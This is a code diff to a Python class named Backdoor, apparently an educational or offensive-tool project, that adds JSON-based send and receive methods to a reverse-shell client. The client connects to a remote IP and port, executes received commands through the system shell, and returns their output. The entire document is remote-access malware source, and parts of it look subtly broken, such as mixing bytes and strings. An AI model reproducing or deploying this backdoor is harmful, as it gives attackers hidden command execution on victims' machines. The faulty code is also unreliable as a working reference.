@@ -2,6 +2,7 @@
 
 import socket
 import subprocess
+import json
 
 class Backdoor:
     def __init__(self, ip, port):
@@ -12,12 +13,25 @@ class Backdoor:
     def execute_system_command(self, command):
         return subprocess.check_output(command, shell=True)
 
+    def reliable_send(self, data):
+        json_data = json.dumps(data)
+        self.connection.send(json_data)
+
+    def reliable_receive(self):
+        json_data = ""
+        while True:
+            try:
+                json_data = json_data + self.connection.recv(1024)
+                return json.loads(json_data)
+            except ValueError:
+                continue
+
     def run(self):
         while True:
-            command = self.connection.recv(1024)
+            command = self.reliable_receive()
             command = command.decode()
             command_result = self.execute_system_command(command)
-            self.connection.send(command_result)
+            self.reliable_send(command_result)
 
         self.connection.close()
 
